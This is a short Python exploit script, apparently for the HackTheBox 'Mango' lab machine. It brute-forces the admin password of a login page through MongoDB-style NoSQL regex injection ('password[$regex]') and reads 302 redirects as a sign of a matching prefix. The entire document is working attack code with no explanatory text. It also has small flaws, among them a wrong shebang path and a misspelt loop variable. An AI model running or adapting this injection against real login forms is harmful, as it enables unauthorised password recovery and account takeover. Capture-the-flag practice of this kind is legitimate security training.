#!/bin/usr/python

import requests
import string
#import urllib.parse

url = 'http://staging-order.mango.htb/index.php'
flag = ""   

# Sexy way to change users
user = 'admin'
#user = 'mango'

# When 302 redirect is seen, we restart our loop
restart = True

while restart:
    retstart = False

    # Regex unfriendly characters: "+" "*" "." "?" "|"
    for i in string.ascii_letters + string.digits + "`~!@#$%^&()-_{}=[]<>;:'":
        payload = flag + i
        post_data = {'username': user, 'password[$regex]' : "^" + payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=False)

        if r.status_code == 302:
            print(payload)
            restart = True
            flag = payload

            if i == "$":
                print ("\n[+] User: " + user + "\n[+] Password: " + flag[:-1])

                exit(0)
            break
